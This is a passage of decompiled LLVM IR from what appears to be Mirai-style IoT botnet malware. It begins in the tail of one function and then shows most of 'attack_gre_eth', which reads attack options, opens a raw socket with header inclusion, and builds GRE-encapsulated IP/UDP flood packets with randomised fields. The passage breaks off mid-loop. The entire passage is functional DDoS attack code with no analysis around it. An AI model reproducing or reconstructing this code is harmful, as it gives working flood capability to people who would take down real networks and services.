  %v2_a5f4 = load i8, i8* bitcast (i8** @global_var_23594.66 to i8*), align 4
  %v3_a5f4 = zext i8 %v2_a5f4 to i32
  store i32 ptrtoint (i32* @global_var_81d0.90 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a5f0, i32* @r4, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v1_a604 = load i32, i32* @r8, align 4
  %v2_a604 = add i32 %v1_a604, %v3_a5f4
  store i32 %v2_a604, i32* %r1.global-to-local, align 4
  %v2_a608 = load i32, i32* @global_var_23598.68, align 4
  %v2_a60c = inttoptr i32 %v2_a5f0 to i32*
  store i32 ptrtoint (i32* @global_var_81d0.90 to i32), i32* %v2_a60c, align 4
  %v3_a610 = load i32, i32* @r4, align 4
  %v4_a610 = add i32 %v3_a610, 4
  %v5_a610 = inttoptr i32 %v4_a610 to i8*
  store i8 9, i8* %v5_a610, align 1
  %v0_a614 = load i32, i32* %r1.global-to-local, align 4
  %v3_a614 = mul i32 %v0_a614, 4
  store i32 %v3_a614, i32* %r1.global-to-local, align 4
  %v5_a618 = inttoptr i32 %v2_a608 to i32*
  %v6_a618 = call i32 @realloc(i32* %v5_a618, i32 %v3_a614, i32 ptrtoint (i32* @global_var_81d0.90 to i32), i32 9)
  %v2_a61c = load i8, i8* bitcast (i8** @global_var_23594.66 to i8*), align 4
  %v3_a61c = zext i8 %v2_a61c to i32
  store i32 %v3_a61c, i32* %r3.global-to-local, align 4
  %v1_a620 = load i32, i32* @r6, align 4
  %v2_a620 = inttoptr i32 %v1_a620 to i32*
  store i32 %v6_a618, i32* %v2_a620, align 4
  %v0_a624 = load i32, i32* @r4, align 4
  %v2_a624 = load i32, i32* %r3.global-to-local, align 4
  %v5_a624 = mul i32 %v2_a624, 4
  %v6_a624 = add i32 %v5_a624, %v6_a618
  %v7_a624 = inttoptr i32 %v6_a624 to i32*
  store i32 %v0_a624, i32* %v7_a624, align 4
  %v0_a628 = load i32, i32* %r3.global-to-local, align 4
  %v1_a628 = load i32, i32* @r8, align 4
  %v2_a628 = add i32 %v1_a628, %v0_a628
  store i32 %v2_a628, i32* %r2.global-to-local, align 4
  %v1_a630 = trunc i32 %v2_a628 to i8
  %v2_a630 = load i32, i32* @r5, align 4
  %v3_a630 = inttoptr i32 %v2_a630 to i8*
  store i8 %v1_a630, i8* %v3_a630, align 1
  %v2_a634 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_a634, i32* @r4, align 4
  store i32 %v6_a330, i32* @r5, align 4
  store i32 %v9_a330, i32* @r6, align 4
  store i32 %v12_a330, i32* @r7, align 4
  store i32 %v15_a330, i32* @r8, align 4
  ret i32 %v1_a628

; uselistorder directives
  uselistorder i32 %v1_a628, { 1, 0 }
  uselistorder i32 %v3_a614, { 1, 0 }
  uselistorder i32 %v1_a5e0, { 1, 0 }
  uselistorder i32 %v3_a5c8, { 1, 0 }
  uselistorder i32 %v1_a594, { 1, 0 }
  uselistorder i32 %v3_a57c, { 1, 0 }
  uselistorder i32 %v1_a548, { 1, 0 }
  uselistorder i32 %v3_a530, { 1, 0 }
  uselistorder i32 %v1_a4fc, { 1, 0 }
  uselistorder i32 %v3_a4e4, { 1, 0 }
  uselistorder i32 %v1_a4b0, { 1, 0 }
  uselistorder i32 %v3_a498, { 1, 0 }
  uselistorder i32 %v1_a464, { 1, 0 }
  uselistorder i32 %v3_a44c, { 1, 0 }
  uselistorder i32 %v1_a418, { 1, 0 }
  uselistorder i32 %v6_a404, { 1, 2, 0, 3 }
  uselistorder i32 %v3_a400, { 1, 0 }
  uselistorder i32 %v1_a3cc, { 1, 0 }
  uselistorder i32 %v3_a3b4, { 1, 0 }
  uselistorder i32 %v2_a390, { 1, 0 }
  uselistorder i32 %v6_a36c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_a368, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 33, 34, 35, 36, 37, 38, 39, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 32, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32* %r2.global-to-local, { 21, 22, 23, 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 20, 16, 17, 18, 19 }
  uselistorder i32* %r1.global-to-local, { 35, 36, 37, 38, 39, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i8 7, { 2, 3, 4, 0, 1 }
  uselistorder i8 4, { 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_23594.66 to i8*), { 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_23595.72 to i32), { 2, 1, 0 }
  uselistorder i8** @global_var_23594.66, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_23594.66 to i32), { 1, 0 }
}

define i32 @attack_gre_eth(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-54 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_a66c = load i32, i32* @r4, align 4
  %v24_a66c = load i32, i32* @fp, align 4
  %v27_a66c = load i32, i32* @lr, align 4
  store i32 0, i32* @sb, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg5, i32* @r4, align 4
  store i32 %arg3, i32* @sl, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_a698 = call i32 @calloc(i32 %arg2, i32 4)
  %v0_a69c = load i32, i32* @r4, align 4
  store i32 %v0_a69c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_a6a8 = load i32, i32* @sb, align 4
  store i32 %v0_a6a8, i32* %r3.global-to-local, align 4
  %v0_a6ac = load i32, i32* @r5, align 4
  store i32 %v0_a6ac, i32* %r0.global-to-local, align 4
  %v5_a6b0 = inttoptr i32 %v0_a69c to i32*
  %v6_a6b0 = call i32 @attack_get_opt_int(i32 %v0_a6ac, i32* %v5_a6b0, i32 2, i32 %v0_a6a8)
  %v1_a6bc = urem i32 %v6_a6b0, 256
  store i32 %v1_a6bc, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a6c8 = load i32, i32* @r4, align 4
  store i32 %v0_a6c8, i32* %r1.global-to-local, align 4
  %v0_a6cc = load i32, i32* @r5, align 4
  store i32 %v0_a6cc, i32* %r0.global-to-local, align 4
  %v5_a6d0 = trunc i32 %v6_a6b0 to i8
  %v7_a6d4 = inttoptr i32 %v0_a6c8 to i32*
  %v8_a6d4 = call i32 @attack_get_opt_int(i32 %v0_a6cc, i32* %v7_a6d4, i32 3, i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32))
  %v0_a6d8 = load i32, i32* @r4, align 4
  store i32 %v0_a6d8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v8_a6d4, i32* %fp.global-to-local, align 4
  %v0_a6e8 = load i32, i32* @r5, align 4
  store i32 %v0_a6e8, i32* %r0.global-to-local, align 4
  %v4_a6ec = inttoptr i32 %v0_a6d8 to i32*
  %v5_a6ec = call i32 @attack_get_opt_int(i32 %v0_a6e8, i32* %v4_a6ec, i32 4, i32 64)
  %v1_a6f4 = urem i32 %v5_a6ec, 256
  store i32 %v1_a6f4, i32* %ip.global-to-local, align 4
  %v0_a6f8 = load i32, i32* @r4, align 4
  store i32 %v0_a6f8, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a704 = load i32, i32* @r5, align 4
  store i32 %v0_a704, i32* %r0.global-to-local, align 4
  %v6_a70c = inttoptr i32 %v0_a6f8 to i32*
  %v7_a70c = call i32 @attack_get_opt_int(i32 %v0_a704, i32* %v6_a70c, i32 5, i32 1)
  %v1_a718 = urem i32 %v7_a70c, 256
  store i32 %v1_a718, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a724 = load i32, i32* @r4, align 4
  store i32 %v0_a724, i32* %r1.global-to-local, align 4
  %v0_a728 = load i32, i32* @r5, align 4
  store i32 %v0_a728, i32* %r0.global-to-local, align 4
  %v6_a730 = inttoptr i32 %v0_a724 to i32*
  %v7_a730 = call i32 @attack_get_opt_int(i32 %v0_a728, i32* %v6_a730, i32 6, i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32))
  %v0_a73c = load i32, i32* @r4, align 4
  store i32 %v0_a73c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_a748 = load i32, i32* @r5, align 4
  store i32 %v0_a748, i32* %r0.global-to-local, align 4
  %v6_a74c = inttoptr i32 %v0_a73c to i32*
  %v7_a74c = call i32 @attack_get_opt_int(i32 %v0_a748, i32* %v6_a74c, i32 7, i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32))
  %v0_a750 = load i32, i32* @r4, align 4
  store i32 %v0_a750, i32* %r1.global-to-local, align 4
  %v0_a754 = load i32, i32* @sb, align 4
  store i32 %v0_a754, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v7_a74c, i32* @r8, align 4
  %v0_a760 = load i32, i32* @r5, align 4
  store i32 %v0_a760, i32* %r0.global-to-local, align 4
  %v4_a764 = inttoptr i32 %v0_a750 to i32*
  %v5_a764 = call i32 @attack_get_opt_int(i32 %v0_a760, i32* %v4_a764, i32 %v0_a754, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a774 = load i32, i32* @r4, align 4
  store i32 %v0_a774, i32* %r1.global-to-local, align 4
  %v0_a778 = load i32, i32* @r5, align 4
  store i32 %v0_a778, i32* %r0.global-to-local, align 4
  %v4_a77c = inttoptr i32 %v0_a774 to i32*
  %v5_a77c = call i32 @attack_get_opt_int(i32 %v0_a778, i32* %v4_a77c, i32 1, i32 1)
  %v1_a784 = urem i32 %v5_a77c, 256
  store i32 %v1_a784, i32* %ip.global-to-local, align 4
  %v0_a788 = load i32, i32* @r4, align 4
  store i32 %v0_a788, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_a790 = load i32, i32* @sb, align 4
  store i32 %v0_a790, i32* %r3.global-to-local, align 4
  %v0_a794 = load i32, i32* @r5, align 4
  store i32 %v0_a794, i32* %r0.global-to-local, align 4
  %v5_a79c = inttoptr i32 %v0_a788 to i32*
  %v6_a79c = call i32 @attack_get_opt_int(i32 %v0_a794, i32* %v5_a79c, i32 18, i32 %v0_a790)
  %v0_a7a4 = load i32, i32* @r4, align 4
  store i32 %v0_a7a4, i32* %r1.global-to-local, align 4
  %v2_a7a8 = load i32, i32* @global_var_260b8.92, align 4
  store i32 %v2_a7a8, i32* %r3.global-to-local, align 4
  store i32 %v6_a79c, i32* @r7, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_a7b4 = load i32, i32* @r5, align 4
  store i32 %v0_a7b4, i32* %r0.global-to-local, align 4
  %v4_a7b8 = inttoptr i32 %v0_a7a4 to i32*
  %v5_a7b8 = call i32 @attack_get_opt_int(i32 %v0_a7b4, i32* %v4_a7b8, i32 24, i32 %v2_a7a8)
  %v0_a7c0 = load i32, i32* @sb, align 4
  store i32 %v0_a7c0, i32* %r0.global-to-local, align 4
  %v1_a7c4 = inttoptr i32 %v0_a7c0 to i32*
  %v2_a7c4 = call i32 @__GI_time(i32* %v1_a7c4)
  %v1_a7c8 = load i32, i32* @r6, align 4
  %v2_a7c8 = add i32 %v1_a7c8, %v2_a7c4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_a7dc = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_a7dc, i32* %r0.global-to-local, align 4
  %v7_a7e0 = icmp eq i32 %v3_a7dc, -1
  store i1 %v7_a7e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a7e0, label %dec_label_pc_ad18, label %dec_label_pc_a7ec

dec_label_pc_a7ec:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a7f4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a7f4, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_a7fc = load i32, i32* @sb, align 4
  store i32 %v0_a7fc, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a808 = call i32 @__GI_setsockopt(i32 %v3_a7dc, i32 %v0_a7fc, i32 3, i32 %v6_a7f4, i32 4)
  store i32 %v5_a808, i32* %r0.global-to-local, align 4
  %v7_a80c = icmp eq i32 %v5_a808, -1
  store i1 %v7_a80c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a80c, label %dec_label_pc_ad24, label %dec_label_pc_a814

dec_label_pc_a814:                                ; preds = %dec_label_pc_a7ec
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v3_a81c = mul i32 %v7_a730, 65536
  store i32 %v3_a81c, i32* %r1.global-to-local, align 4
  %v0_a820 = load i32, i32* @r8, align 4
  %v0_a824 = load i32, i32* %fp.global-to-local, align 4
  %v3_a824 = mul i32 %v0_a824, 65536
  store i32 %v3_a824, i32* %fp.global-to-local, align 4
  %v0_a828 = load i32, i32* @r7, align 4
  %v1_a828 = urem i32 %v0_a828, 256
  store i32 %v1_a828, i32* @r7, align 4
  %v3_a82c = urem i32 %v0_a824, 65536
  store i32 %v3_a82c, i32* %r3.global-to-local, align 4
  %v3_a830 = urem i32 %v7_a730, 65536
  store i32 %v3_a830, i32* %ip.global-to-local, align 4
  %v3_a834 = urem i32 %v0_a820, 65536
  %v2_a838 = icmp eq i32 %arg2, 0
  store i1 %v2_a838, i1* %cpsr_z.global-to-local, align 1
  %v0_a848 = load i32, i32* @sb, align 4
  store i32 %v0_a848, i32* %stack_var_-44, align 4
  br i1 %v2_a838, label %dec_label_pc_aa50.preheader, label %dec_label_pc_a85c

dec_label_pc_a85c:                                ; preds = %dec_label_pc_a814
  %v3_a820 = mul i32 %v0_a820, 65536
  %v3_a860 = mul i32 %v5_a764, 65536
  %v1_a864 = add i32 %v3_a860, 4325376
  %v0_a824.not = or i32 %v0_a824, -65536
  %v1_a868 = xor i32 %v0_a824.not, 65535
  %v3_a874 = mul i32 %v1_a868, 65536
  store i32 %v3_a874, i32* @r6, align 4
  %tmp68 = udiv i32 %v1_a864, 256
  %v3_a88c = and i32 %tmp68, 65280
  store i32 %v3_a88c, i32* %r3.global-to-local, align 4
  %v1_a890 = add i32 %v3_a860, 524288
  %tmp69 = mul i32 %v0_a824, 256
  %v3_a894 = and i32 %tmp69, 65280
  %v1_a898 = add i32 %v3_a860, 1835008
  %tmp70 = mul nsw i32 %v1_a868, 256
  %v3_a89c = and i32 %tmp70, 65280
  %v4_a8a0 = udiv i32 %v1_a864, 16777216
  %v5_a8a0 = or i32 %v4_a8a0, %tmp68
  %v3_a8a8 = udiv i32 %v1_a898, 256
  %v5_a8ac = trunc i32 %v5_a8a0 to i16
  %tmp71 = udiv i32 %v0_a824, 256
  %v4_a8b0 = urem i32 %tmp71, 256
  %v5_a8b0 = or i32 %v4_a8b0, %v3_a894
  store i32 %v5_a8b0, i32* @r7, align 4
  %tmp72 = udiv i32 %v1_a868, 256
  %v4_a8b4 = urem i32 %tmp72, 256
  %v5_a8b4 = or i32 %v4_a8b4, %v3_a89c
  store i32 %v5_a8b4, i32* @fp, align 4
  store i32 %v3_a820, i32* %r2.global-to-local, align 4
  store i32 %v3_a81c, i32* %r1.global-to-local, align 4
  %v1_a8c0 = and i32 %v3_a8a8, 65280
  %tmp73 = mul i32 %v7_a730, 256
  %v3_a8c4 = and i32 %tmp73, 65280
  %tmp74 = mul i32 %v0_a820, 256
  %v3_a8c8 = and i32 %tmp74, 65280
  %v4_a8d0 = udiv i32 %v1_a898, 16777216
  %v5_a8d0 = or i32 %v1_a8c0, %v4_a8d0
  store i32 %v5_a8d0, i32* @r5, align 4
  %tmp75 = udiv i32 %v7_a730, 256
  %v4_a8d4 = urem i32 %tmp75, 256
  %v5_a8d4 = or i32 %v4_a8d4, %v3_a8c4
  store i32 %v5_a8d4, i32* %r0.global-to-local, align 4
  %tmp76 = udiv i32 %v0_a820, 256
  %v4_a8d8 = urem i32 %tmp76, 256
  %v5_a8d8 = or i32 %v4_a8d8, %v3_a8c8
  store i32 %v5_a8d8, i32* %ip.global-to-local, align 4
  %tmp77 = udiv i32 %v1_a890, 256
  %v3_a8dc = and i32 %tmp77, 65280
  store i32 %v3_a8dc, i32* @lr, align 4
  %v5_a8e8 = trunc i32 %v5_a8d0 to i16
  %v4_a8ec = udiv i32 %v1_a890, 16777216
  %v5_a8ec = or i32 %v3_a8dc, %v4_a8ec
  store i32 %v5_a8ec, i32* @r8, align 4
  store i32 %v0_a848, i32* @r4, align 4
  %v4_a948 = sext i8 %v5_a6d0 to i32
  %v1_a954 = trunc i32 %v5_a6ec to i8
  %v2_aa08 = icmp eq i32 %v1_a828, 0
  %sext = mul nuw i32 %v5_a8d4, 65536
  %v4_aa2c = sdiv i32 %sext, 65536
  %sext7 = mul nuw i32 %v5_a8d8, 65536
  %v4_aa34 = sdiv i32 %sext7, 65536
  br label %dec_label_pc_a8f4

dec_label_pc_a8f4:                                ; preds = %bb80, %dec_label_pc_a85c
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_a900 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_a900, i32* %r0.global-to-local, align 4
  %v3_a908 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a908, i32* %r2.global-to-local, align 4
  %v2_a90c = load i32, i32* @r4, align 4
  %v5_a90c = mul i32 %v2_a90c, 4
  %v6_a90c = add i32 %v5_a90c, %v2_a698
  %v7_a90c = inttoptr i32 %v6_a90c to i32*
  store i32 %v2_a900, i32* %v7_a90c, align 4
  store i32 %v2_a698, i32* %r1.global-to-local, align 4
  %v0_a914 = load i32, i32* %r2.global-to-local, align 4
  %v3_a914 = mul i32 %v0_a914, 32
  store i32 %v3_a914, i32* %r3.global-to-local, align 4
  %v4_a918 = mul i32 %v0_a914, 4
  %v5_a918 = add i32 %v4_a918, %v2_a698
  %v6_a918 = inttoptr i32 %v5_a918 to i32*
  %v7_a918 = load i32, i32* %v6_a918, align 4
  store i32 %v7_a918, i32* %r4.global-to-local, align 4
  %v5_a91c = mul i32 %v0_a914, 24
  store i32 %v5_a91c, i32* %r3.global-to-local, align 4
  %v1_a920 = load i32, i32* @sl, align 4
  %v2_a920 = add i32 %v1_a920, %v5_a91c
  store i32 %v2_a920, i32* %lr.global-to-local, align 4
  %v1_a924 = inttoptr i32 %v7_a918 to i8*
  %v2_a924 = load i8, i8* %v1_a924, align 1
  %tmp = urem i8 %v2_a924, 16
  %v1_a928 = zext i8 %tmp to i32
  %v1_a92c = or i32 %v1_a928, 64
  store i32 %v1_a92c, i32* %r3.global-to-local, align 4
  %v1_a930 = trunc i32 %v1_a92c to i8
  store i8 %v1_a930, i8* %v1_a924, align 1
  %v0_a934 = load i32, i32* %r4.global-to-local, align 4
  %v1_a934 = inttoptr i32 %v0_a934 to i8*
  %v2_a934 = load i8, i8* %v1_a934, align 1
  %v1_a938 = and i8 %v2_a934, -16
  %v1_a93c = or i8 %v1_a938, 5
  store i32 %v1_a718, i32* %r3.global-to-local, align 4
  store i8 %v1_a93c, i8* %v1_a934, align 1
  store i32 %v4_a948, i32* %r1.global-to-local, align 4
  %v2_a94c = load i32, i32* %r4.global-to-local, align 4
  %v3_a94c = add i32 %v2_a94c, 1
  %v4_a94c = inttoptr i32 %v3_a94c to i8*
  store i8 %v5_a6d0, i8* %v4_a94c, align 1
  store i32 %v1_a6f4, i32* %r2.global-to-local, align 4
  %v2_a954 = load i32, i32* %r4.global-to-local, align 4
  %v3_a954 = add i32 %v2_a954, 8
  %v4_a954 = inttoptr i32 %v3_a954 to i8*
  store i8 %v1_a954, i8* %v4_a954, align 1
  %v0_a958 = load i32, i32* %r3.global-to-local, align 4
  %v2_a958 = icmp eq i32 %v0_a958, 0
  store i1 %v2_a958, i1* %cpsr_z.global-to-local, align 1
  %v2_a960 = load i32, i32* %r4.global-to-local, align 4
  %v3_a960 = add i32 %v2_a960, 2
  %v4_a960 = inttoptr i32 %v3_a960 to i16*
  store i16 %v5_a8ac, i16* %v4_a960, align 2
  %v2_a968 = load i32, i32* %r4.global-to-local, align 4
  %v3_a968 = add i32 %v2_a968, 9
  %v4_a968 = inttoptr i32 %v3_a968 to i8*
  store i8 47, i8* %v4_a968, align 1
  store i32 %v5_a7b8, i32* %r3.global-to-local, align 4
  %v1_a970 = load i32, i32* %r4.global-to-local, align 4
  %v2_a970 = add i32 %v1_a970, 12
  %v3_a970 = inttoptr i32 %v2_a970 to i32*
  store i32 %v5_a7b8, i32* %v3_a970, align 4
  %v0_a974 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a974, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_a8f4
  store i32 64, i32* %r2.global-to-local, align 4
  %v3_a978 = load i32, i32* %r4.global-to-local, align 4
  %v4_a978 = add i32 %v3_a978, 6
  %v5_a978 = inttoptr i32 %v4_a978 to i16*
  store i16 64, i16* %v5_a978, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_a8f4, %bb
  %v0_a97c = load i32, i32* %lr.global-to-local, align 4
  %v1_a97c = add i32 %v0_a97c, 16
  %v2_a97c = inttoptr i32 %v1_a97c to i32*
  %v3_a97c = load i32, i32* %v2_a97c, align 4
  store i32 22528, i32* %ip.global-to-local, align 4
  %v1_a984 = load i32, i32* %r4.global-to-local, align 4
  %v2_a984 = add i32 %v1_a984, 16
  %v3_a984 = inttoptr i32 %v2_a984 to i32*
  store i32 %v3_a97c, i32* %v3_a984, align 4
  %v0_a988 = load i32, i32* %r4.global-to-local, align 4
  %v1_a988 = add i32 %v0_a988, 24
  store i32 %v1_a988, i32* %r0.global-to-local, align 4
  %v1_a98c = add i32 %v0_a988, 20
  store i32 %v1_a98c, i32* %r1.global-to-local, align 4
  %v0_a990 = load i32, i32* %ip.global-to-local, align 4
  %v1_a990 = add i32 %v0_a990, 101
  store i32 %v1_a990, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_a99c = load i32, i32* @r7, align 4
  %v1_a99c = trunc i32 %v0_a99c to i16
  %v3_a99c = add i32 %v0_a988, 4
  %v4_a99c = inttoptr i32 %v3_a99c to i16*
  store i16 %v1_a99c, i16* %v4_a99c, align 2
  %v0_a9a0 = load i32, i32* %ip.global-to-local, align 4
  %v1_a9a0 = trunc i32 %v0_a9a0 to i16
  %v2_a9a0 = load i32, i32* %r1.global-to-local, align 4
  %v3_a9a0 = add i32 %v2_a9a0, 2
  %v4_a9a0 = inttoptr i32 %v3_a9a0 to i16*
  store i16 %v1_a9a0, i16* %v4_a9a0, align 2
  %v0_a9a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a9a4 = trunc i32 %v0_a9a4 to i8
  %v2_a9a4 = load i32, i32* %r0.global-to-local, align 4
  %v3_a9a4 = add i32 %v2_a9a4, 13
  %v4_a9a4 = inttoptr i32 %v3_a9a4 to i8*
  store i8 %v1_a9a4, i8* %v4_a9a4, align 1
  %v0_a9a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_a9a8 = trunc i32 %v0_a9a8 to i8
  %v2_a9a8 = load i32, i32* %r0.global-to-local, align 4
  %v3_a9a8 = add i32 %v2_a9a8, 12
  %v4_a9a8 = inttoptr i32 %v3_a9a8 to i8*
  store i8 %v1_a9a8, i8* %v4_a9a8, align 1
  %v0_a9ac = load i32, i32* %r4.global-to-local, align 4
  %v1_a9ac = add i32 %v0_a9ac, 38
  %v2_a9ac = inttoptr i32 %v1_a9ac to i8*
  %v3_a9ac = load i8, i8* %v2_a9ac, align 1
  %tmp86 = urem i8 %v3_a9ac, 16
  %v1_a9b0 = zext i8 %tmp86 to i32
  %v1_a9b4 = or i32 %v1_a9b0, 64
  store i32 %v1_a9b4, i32* %r3.global-to-local, align 4
  %v1_a9b8 = trunc i32 %v1_a9b4 to i8
  store i8 %v1_a9b8, i8* %v2_a9ac, align 1
  %v0_a9bc = load i32, i32* %r4.global-to-local, align 4
  %v1_a9bc = add i32 %v0_a9bc, 38
  %v2_a9bc = inttoptr i32 %v1_a9bc to i8*
  %v3_a9bc = load i8, i8* %v2_a9bc, align 1
  %v4_a9bc = zext i8 %v3_a9bc to i32
  %v1_a9c0 = and i32 %v4_a9bc, 240
  %v1_a9c4 = or i32 %v1_a9c0, 5
  store i32 %v1_a9c4, i32* %r2.global-to-local, align 4
  %v1_a9c8 = trunc i32 %v1_a9c4 to i8
  store i8 %v1_a9c8, i8* %v2_a9bc, align 1
  store i32 %v4_a948, i32* %ip.global-to-local, align 4
  %v0_a9d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_a9d0 = add i32 %v0_a9d0, 38
  store i32 %v1_a9d0, i32* @r5, align 4
  %v3_a9d4 = add i32 %v0_a9d0, 39
  %v4_a9d4 = inttoptr i32 %v3_a9d4 to i8*
  store i8 %v5_a6d0, i8* %v4_a9d4, align 1
  store i32 %v5_a8d0, i32* %lr.global-to-local, align 4
  %v2_a9dc = load i32, i32* @r5, align 4
  %v3_a9dc = add i32 %v2_a9dc, 2
  %v4_a9dc = inttoptr i32 %v3_a9dc to i16*
  store i16 %v5_a8e8, i16* %v4_a9dc, align 2
  store i32 %v1_a6f4, i32* %r1.global-to-local, align 4
  %v0_a9e4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a9e4, label %.thread8, label %bb78

.thread8:                                         ; preds = %.thread
  store i32 17, i32* %r3.global-to-local, align 4
  br label %bb79

bb78:                                             ; preds = %.thread
  store i32 64, i32* %r2.global-to-local, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v3_a9ec = load i32, i32* @r5, align 4
  %v4_a9ec = add i32 %v3_a9ec, 6
  %v5_a9ec = inttoptr i32 %v4_a9ec to i16*
  store i16 64, i16* %v5_a9ec, align 2
  %v0_a9f0.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t85 = trunc i32 %v0_a9f0.pre to i8
  br label %bb79

bb79:                                             ; preds = %.thread8, %bb78
  %v5_a6ec.sink.off0 = phi i8 [ %v1_a954, %.thread8 ], [ %extract.t85, %bb78 ]
  %v2_a9f0 = load i32, i32* @r5, align 4
  %v3_a9f0 = add i32 %v2_a9f0, 8
  %v4_a9f0 = inttoptr i32 %v3_a9f0 to i8*
  store i8 %v5_a6ec.sink.off0, i8* %v4_a9f0, align 1
  %v0_a9f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a9f4 = trunc i32 %v0_a9f4 to i8
  %v2_a9f4 = load i32, i32* @r5, align 4
  %v3_a9f4 = add i32 %v2_a9f4, 9
  %v4_a9f4 = inttoptr i32 %v3_a9f4 to i8*
  store i8 %v1_a9f4, i8* %v4_a9f4, align 1
  %v0_a9f8 = load i32, i32* @fp, align 4
  %v1_a9f8 = trunc i32 %v0_a9f8 to i16
  %v2_a9f8 = load i32, i32* @r5, align 4
  %v3_a9f8 = add i32 %v2_a9f8, 4
  %v4_a9f8 = inttoptr i32 %v3_a9f8 to i16*
  store i16 %v1_a9f8, i16* %v4_a9f8, align 2
  %v0_a9fc = call i32 @rand_next()
  store i32 %v0_a9fc, i32* %r0.global-to-local, align 4
  store i32 %v1_a828, i32* %ip.global-to-local, align 4
  store i1 %v2_aa08, i1* %cpsr_z.global-to-local, align 1
  %v1_aa0c = sub i32 1023, %v0_a9fc
  store i32 %v1_aa0c, i32* %r3.global-to-local, align 4
  br i1 %v2_aa08, label %.thread9, label %.thread10

.thread9:                                         ; preds = %bb79
  %v2_aa14 = load i32, i32* @r5, align 4
  %v3_aa14 = add i32 %v2_aa14, 16
  %v4_aa14 = inttoptr i32 %v3_aa14 to i32*
  store i32 %v1_aa0c, i32* %v4_aa14, align 4
  br label %bb80
